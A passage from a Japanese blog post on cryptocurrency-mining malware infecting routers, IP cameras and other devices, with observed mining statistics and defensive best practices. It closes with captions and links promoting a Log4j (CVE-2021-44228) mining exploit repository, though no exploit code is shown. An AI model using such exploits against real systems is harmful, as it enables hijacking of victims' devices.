デバイス、特にホーム ルーターに大混乱を引き起こしたことに端を発しており、&nbsp;&nbsp;昨年、Miraiを使用して<a href="https://www.trendmicro.com/vinfo/de/security/news/cyber-attacks/a-rundown-of-the-biggest-cybersecurity-incidents-of-2016#WorstTroublemakerMirai">有名なサイトをオフラインにしました。</a>2016 年の最初の 3 四半期にわたって、&nbsp;&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/home-routers-mitigating-attacks-that-turn-them-to-zombies/">Windows システム、ホーム ルーター、および IP カメラで構成されるビットコイン マイニング ゾンビ軍団を</a>検出しました。&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>2017 年 1 月 1 日から 6 月 24 日まで、ビットコインをマイニングしているさまざまな種類のデバイスも観測されましたが、テレメトリではこれらのアクティビティが承認されているかどうかを確認できませんでした。また、2017 年 2 月には毎日 1,800 件のイベントがトリガーされていたビットコイン マイニング アクティビティが、2017 年 3 月には 3,000 件に 40% 急増しました。&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>ビットコインのマイニングは (少なくとも多くの国では) 本質的に違法ではありませんが、所有者の認識と同意がない場合、妥協を伴う可能性があります。Windows を実行しているマシンで最もビットコインのマイニング活動が行われていることがわかりましたが、注目すべき点は次のとおりです。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>iOS (iPhone 4 から iPhone 7) を含む Macintosh OS 上のシステム</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Debian Linux OS の派生物である Ubuntu OS で実行されるデバイス</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ホームルーター</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>データセンターで使用される環境監視装置</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Android 搭載のスマート TV とモバイル デバイス</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>IP カメラ</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>プリント サーバー</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ゲーム機</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>[読む:&nbsp;&nbsp;</strong><a href="https://www.trendmicro.com/vinfo/de/security/news/internet-of-things/securing-routers-against-mirai-home-network-attacks"><strong>Mirai とホーム ネットワーク攻撃からルーターを保護する方法</strong></a><strong>]</strong></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>暗号通貨をマイニングするマルウェアは、被害者を問題の一部にする可能性があります</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>暗号通貨マイニング マルウェアは、システム パフォーマンスを低下させ、エンド ユーザーや企業を情報の盗難、ハイジャック、およびその他の多数のマルウェアの危険にさらす可能性があります。そして、これらのマシンをゾンビに変えてしまうことで、仮想通貨マルウェアは、意図せずに犠牲者を問題の一部にすることさえあります.&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>実際、感染したデバイス、そして最終的には企業の資産やユーザーのデータに悪影響を与えるため、信頼できる脅威となっています。これらのマルウェアに対する特効薬はありませんが、次のベスト プラクティスに従うことで軽減できます。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>デバイスを最新のパッチで定期的に更新することで、攻撃者が脆弱性をシステムへの入り口として利用するのを防ぐことができます</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>デバイスのデフォルトの認証情報を変更または強化すると、デバイスが不正アクセスを受けにくくなります</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>デバイスのファイアウォール (ホーム ルーター用) を有効にする (利用可能な場合)、または侵入の試みを軽減するために侵入検知および防止システムを展開する</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>既知の攻撃ベクトルに対する注意: ソーシャル エンジニアリング リンク、疑わしい Web サイトからの添付ファイルまたはファイル、疑わしいサードパーティ ソフトウェア/アプリケーション、迷惑メール&nbsp;</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><a href="https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint/endpoint-application-control.html">IT/システム管理者および情報セキュリティの専門家は、疑わしい実行可能ファイルの実行またはインストールを防止する、アプリケーションのホワイトリスト</a>&nbsp;または同様のセキュリティ メカニズムを検討することもできます&nbsp;。ネットワーク トラフィックを積極的に監視することで、マルウェア感染を示す危険信号をより適切に特定できます。最小権限の原則の適用、&nbsp;&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/infosec-guide-web-injections">Web インジェクションに対する対策の</a>開発、&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/infosec-guide-email-threats">メール ゲートウェイの保護</a>、&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/infosec-guide-email-threats">企業のモバイル デバイスのベスト プラクティスの実装</a>、およびサイバーセキュリティを意識した従業員の育成は、企業がこれらの脅威にさらされるのを減らすための多層防御アプローチの一部です。しかし、究極的には、仮想通貨をマイニングするマルウェアに対するインターネット接続デバイスのセキュリティは、ユーザーにとって負担になるだけではありません。独自の設計および機器のメーカーも、&nbsp;それらが実行される<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/internet-things-ecosystem-broken-fix/">エコシステムを保護する上で重要な役割</a>を果たします&nbsp;。</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1652,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://cryptodeeptech.ru/blockchain-attack-vectors/" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeeptech.ru/wp-content/uploads/2022/12/image-68.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト" class="wp-image-1652"/></a><figcaption class="wp-element-caption"><a href="https://cryptodeeptech.ru/blockchain-attack-vectors/" target="_blank" rel="noreferrer noopener"><code>https://cryptodeeptech.ru/blockchain-attack-vectors/</code></a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>過半数では十分ではありません: ビットコインのマイニングは脆弱です</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":1649,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://cryptodeep.ru/doc/Majority_is_not_Enough_Bitcoin_Mining_is_Vulnerable.pdf" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeeptech.ru/wp-content/uploads/2022/12/image-67.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト" class="wp-image-1649"/></a><figcaption class="wp-element-caption"><a href="https://cryptodeep.ru/doc/Majority_is_not_Enough_Bitcoin_Mining_is_Vulnerable.pdf" target="_blank" rel="noreferrer noopener"><code>https://cryptodeep.ru/doc/Majority_is_not_Enough_Bitcoin_Mining_is_Vulnerable.pdf</code></a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/Log4j-Vulnerability" target="_blank" rel="noreferrer noopener">GitHub</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">テレグラム: https://t.me/cryptodeeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://youtu.be/PNDBjoT83zA" target="_blank" rel="noreferrer noopener"><strong>ビデオ: https://youtu.be/PNDBjoT83zA</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/log4j-vulnerability" target="_blank" rel="noreferrer noopener">ソース: https://cryptodeeep.ru/log4j-脆弱性</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":1874} -->
<figure class="wp-block-image"><img src="https://cryptodeeptech.ru/wp-content/uploads/2023/01/032-1-1024x576.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト" class="wp-image-1874"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">暗号解読</a></p>
<!-- /wp:paragraph -->
